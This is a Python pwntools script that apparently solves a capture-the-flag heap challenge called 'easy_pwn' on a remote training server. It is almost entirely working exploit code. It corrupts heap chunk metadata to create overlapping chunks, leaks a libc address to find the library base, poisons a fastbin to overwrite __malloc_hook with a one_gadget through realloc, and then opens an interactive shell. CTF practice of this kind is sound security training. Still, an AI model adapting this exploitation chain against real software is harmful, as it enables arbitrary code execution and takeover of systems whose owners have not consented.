from pwn import *

# p = process('./easy_pwn')
p = remote('node4.buuoj.cn', 26600)
elf = ELF('./easy_pwn')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')


def add(size_):
    p.recvuntil(b'choice:')
    p.sendline(b'1')
    p.recvuntil(b'size:')
    p.sendline(size_)


def edit(id_, size_, mess):
    p.recvuntil(b'choice:')
    p.sendline(b'2')
    p.recvuntil(b'index:')
    p.sendline(id_)
    p.recvuntil(b'size:')
    p.sendline(size_)
    p.recvuntil(b'content:')
    p.sendline(mess)


def delete(id_):
    p.recvuntil(b'choice:')
    p.sendline(b'3')
    p.recvuntil(b'index:')
    p.sendline(id_)


def show(id_):
    p.recvuntil(b'choice:')
    p.sendline(b'4')
    p.recvuntil(b'index:')
    p.sendline(id_)


add(b'24')
add(b'16')
add(b'144')
add(b'16')
payload = b'a' * 0x10 + p64(0x20) + p8(0xa1)
edit(b'0', b'34', payload)
payload = b'a' * 0x70 + p64(0xa0) + p64(0x21) + b'a' * 0x10 + p8(0x20)
edit(b'2', b'154', payload)
delete(b'1')
add(b'144')
payload = b'a' * 0x10 + p64(0) + p64(0xa1)
edit(b'1', b'32', payload)
delete(b'2')
show(b'1')
bk_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
malloc_hook_addr = bk_addr - 88 - 0x10
print(hex(malloc_hook_addr))
base_addr = malloc_hook_addr - lib.symbols['__malloc_hook']
free_got = elf.got['free']
add(b'128')
payload = p64(0) * 3 + p64(0x71) + p64(malloc_hook_addr-0x23) * 2 + b'a' * 0x50 + p64(0x80) + p64(0x21)
edit(b'1', b'144', payload)
delete(b'2')
payload = p64(0) * 3 + p64(0x71) + p64(malloc_hook_addr-0x23) * 2
edit(b'1', b'48', payload)
add(b'96')
add(b'96')
ret_addr = base_addr + 0x0000000000000937
pop_rdi = base_addr + 0x0000000000021102
binsh_addr = base_addr + next(lib.search(b'/bin/sh'))
system_addr = base_addr + lib.symbols['system']
one_gadget = base_addr + 0x4526a
realloc_addr = base_addr + lib.symbols['realloc']
payload = b'a' * 11 + p64(one_gadget) + p64(realloc_addr)
edit(b'4', b'27', payload)
# gdb.attach(p)
# pause()
add(b'60')
p.interactive()
